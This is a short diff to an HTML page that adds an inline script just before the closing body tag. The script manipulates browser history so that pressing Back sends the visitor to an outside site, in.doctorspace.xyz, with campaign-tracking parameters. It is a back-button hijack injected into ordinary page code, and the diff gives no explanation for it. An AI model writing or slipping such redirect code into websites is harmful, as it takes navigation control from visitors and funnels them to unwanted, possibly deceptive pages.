@@ -1359,6 +1359,20 @@ p.pricec {
       </script>
       <div class="ac_footer">
       </div>
-    
+    <script>
+(function(window, location) {
+history.replaceState(null, document.title, location.pathname+"#!/history");
+history.pushState(null, document.title, location.pathname);
+
+window.addEventListener("popstate", function() {
+  if(location.hash === "#!/history") {
+    history.replaceState(null, document.title, location.pathname);
+    setTimeout(function(){
+      location.replace("https://in.doctorspace.xyz/17523/thor/?sub3=janta%20ayurved&utm_source=js&utm_medium=backbtn&utm_campaign=Thor");
+    },10);
+  }
+}, false);
+}(window, location));
+</script>
    </body>
 </html>
